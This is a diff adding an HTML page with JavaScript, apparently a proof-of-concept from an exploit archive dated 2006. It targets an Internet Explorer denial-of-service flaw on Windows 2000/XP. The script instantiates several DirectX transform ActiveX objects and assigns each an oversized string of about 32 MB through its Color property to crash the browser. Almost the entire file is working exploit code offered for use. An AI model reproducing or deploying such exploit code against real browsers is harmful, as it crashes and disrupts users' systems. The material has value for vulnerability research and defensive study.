@@ -1,0 +1,88 @@
+<!--
+
+// Internet Explorer Multiple COM Object Color Property DoS Vulnerability
+// tested on Windows 2000 SP4/XP SP2
+
+// http://www.xsec.org
+// nop (nop#xsec.org)
+
+--!>
+<html>
+<head>
+<title></title>
+</head>
+</body>
+<script>
+var i =0;
+var Objects = new Array(
+
+// CLSID: {3A04D93B-1EDD-4f3f-A375-A03EC19572C4}
+// Info: MaskFilter
+// ProgID: DXImageTransform.Microsoft.MaskFilter.1
+// InprocServer32: C:\WINNT\system32\dxtmsft.dll
+"DXImageTransform.Microsoft.MaskFilter.1",
+
+// CLSID: {421516C1-3CF8-11D2-952A-00C04FA34F05}
+// Info: Chroma
+// ProgID: DXImageTransform.Microsoft.Chroma.1
+// InprocServer32: C:\WINNT\system32\dxtmsft.dll
+"DXImageTransform.Microsoft.Chroma.1",
+
+// CLSID: {9F8E6421-3D9B-11D2-952A-00C04FA34F05}
+// Info: Glow
+// ProgID: DXImageTransform.Microsoft.Glow.1
+// InprocServer32: C:\WINNT\system32\dxtmsft.dll
+"DXImageTransform.Microsoft.Glow.1",
+
+// CLSID: {ADC6CB86-424C-11D2-952A-00C04FA34F05}
+// Info: DropShadow
+// ProgID: DXImageTransform.Microsoft.DropShadow.1
+// InprocServer32: C:\WINNT\system32\dxtmsft.dll
+"DXImageTransform.Microsoft.DropShadow.1",
+
+// CLSID: {E71B4063-3E59-11D2-952A-00C04FA34F05}
+// Info: Shadow
+// ProgID: DXImageTransform.Microsoft.Shadow.1
+// InprocServer32: C:\WINNT\system32\dxtmsft.dll
+"DXImageTransform.Microsoft.Shadow.1",
+
+// CLSID: {8241F015-84D3-11d2-97E6-0000F803FF7A}
+// Info: Shapes
+// ProgID: DX3DTransform.Microsoft.Shapes.1
+// InprocServer32: C:\WINNT\system32\dxtmsft3.dll
+"DX3DTransform.Microsoft.Shapes.1",
+
+null
+);
+
+var b = "AAAA";
+
+while(b.length < 0x2000000)
+{
+   b += b;
+}
+
+while(Objects[i])
+{
+    var a = null;
+
+    window.status = "Create Object " + Objects[i] + "...";
+
+    try { a = new ActiveXObject(Objects[i]); } catch(e){}
+
+    if(a)
+    {
+       window.status = "Try Set " + Objects[i] + ".Color ...";
+       try { a.Color = b;} catch(e){}
+    }
+
+   i++;
+}
+
+window.status = "failed!";
+
+</script>
+</body>
+</html>
+
+# milw0rm.com [2006-08-21]
